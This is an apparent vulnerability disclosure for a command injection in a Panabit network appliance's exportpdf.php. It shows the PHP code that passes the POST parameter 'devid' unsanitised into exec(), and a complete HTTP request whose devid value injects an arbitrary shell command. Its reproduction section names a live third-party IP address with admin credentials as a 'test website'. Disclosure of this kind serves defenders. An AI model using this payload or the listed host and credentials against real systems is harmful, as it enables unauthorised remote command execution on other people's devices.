

### vulnerability analysis

#### code analysis
![image-20240326163955035](https://github.com/tianqing191/book.io/assets/114899974/280ef07a-2493-42cf-9d4c-79b30f43392d)



```
$cmd = LOGDPATH."/bin/logeye user_behavior topiplist 'devid=$devid' ".
	"'ipaddr=$ipaddr' longstart=$longstart longend=$longend ".
	"topn=25 sort=total 'errfile=$errfile' 'iptype=$iptype' ".
	"'grpid=$grpid' bexport=0 'filename=$filename'";
exec($cmd, $out, $ret);
```

**The devid in the variable can be controlled**

![image](https://github.com/tianqing191/book.io/assets/114899974/e677a2a7-993b-454b-a1be-55466cdef7ae)


```
$devid = $_POST['devid'];
$ipaddr = $_POST['ip'];
$strstart = $_POST['tmstart'];
$strend = $_POST['tmend'];
$top = $_POST['top'];
$iptype = $_POST['iptype'];
$grpid = $_POST['ipgroup'];
$cusname =  iconv('utf-8','gb2312', $_POST['cusname']);
$extra = $_POST['extra'];
$errfile = _CHECKING_STATUS_F.'/'.$_POST['errname'];
```

Directly bring into execution

**Payload**

```
POST /Maintain/exportpdf.php HTTP/1.1
Host: [ip]:[port]
Cookie: []
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

devid=';[command];
```

### **Reproduction**


Enter the backend

**Send payload**

### Login to the backend to access URL+cretime.txt. If<=20240323, there is a vulnerability

#### To reproduce, you need to create your own URL
**Test website https://103.112.242.132/**
admin:panabit
**demo**
![image](https://github.com/tianqing191/book.io/assets/114899974/67abed44-7de2-4be4-b19f-e3283c9f7251)


#### Successfully reproduced cases

![image-20240326165530336](https://github.com/tianqing191/book.io/assets/114899974/98e13401-0255-4ed8-870e-9076d5400bc0)
